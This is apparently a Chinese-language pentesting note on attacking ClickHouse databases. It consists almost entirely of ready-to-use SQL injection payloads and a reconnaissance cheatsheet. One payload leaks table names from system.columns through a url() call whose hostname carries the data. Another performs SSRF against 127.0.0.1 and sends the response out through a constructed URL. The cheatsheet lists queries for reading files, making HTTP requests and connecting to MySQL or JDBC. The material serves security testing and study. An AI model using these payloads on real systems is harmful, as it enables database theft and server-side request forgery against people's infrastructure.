---
title: "攻击Clickhouse"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:40:22+08:00
draft: false
---

文档: <https://clickhouse.tech/docs/zh/>

file 函数可以读取文件, 但不能穿越到父目录

{{< figure src="/ox-hugo/2021-01-14_20-25-31_screenshot.png" >}}

报错注入, url 函数找不到 host, 抛出异常

```nil
')+or+(select+c+from+url('http://'||arrayStringConcat((select+groupUniqArray(table)+from+system.columns),',+')||'','CSV','c+String'))=('
```

SSRF, 结果中可能包含 SSRF 的响应内容(小写)

```nil
')+or+(select+c+from+url('http://RESULT-'||arrayStringConcat((select+groupArray(c)+from+url('http://127.0.0.1/','CSV','c+String')),unhex('0a'))||'','CSV','c+String'))=('
```

cheatsheet

| Goal                               | Payload                                                                                              |
|------------------------------------|------------------------------------------------------------------------------------------------------|
| Version                            | SELECT version()                                                                                     |
| Current DB                         | SELECT currentDatabase()                                                                             |
| List DB                            | SHOW databases OR SELECT \* FROM system.databases                                                    |
| List columns                       | SELECT \* FROM system.columns                                                                        |
| List tables                        | SELECT \* FROM system.tables                                                                         |
| Hostname                           | SELECT hostName()                                                                                    |
| Comment                            | SELECT 1 _**comment**_ OR SELECT 1—comment                                                           |
| Dummy table (dual)                 | SELECT \* FROM system.one                                                                            |
| Current User                       | SELECT ‘current_user’,user FROM system.processes WHERE query LIKE ‘%current_user%’                   |
| Current os_user                    | SELECT os_user FROM system.processes                                                                 |
| HTTP request                       | SELECT \* FROM url(‘<http://server>’, ‘CSV’, col String)                                             |
| Read file                          | SELECT \* FROM file(‘nameFile’, ‘CSV’, col String)                                                   |
| Unhex                              | SELECT unhex(‘746f62695f70697a6461’)                                                                 |
| Create an array of argument values | SELECT groupArray(x)                                                                                 |
| Concat array of strings            | SELECT arrayStringConcat(arr[, separator])                                                           |
| Connect to MySQL                   | mysql(‘host:port’, ‘database’, ‘table’, ‘user’, ‘password'[, replace_query, ‘on_duplicate_clause’]); |
| JDBC connection                    | SELECT \* FROM jdbc(‘jdbc:mysql://localhost:3306/?user=root&amp;password=root’, ‘schema’, ‘table’)   |
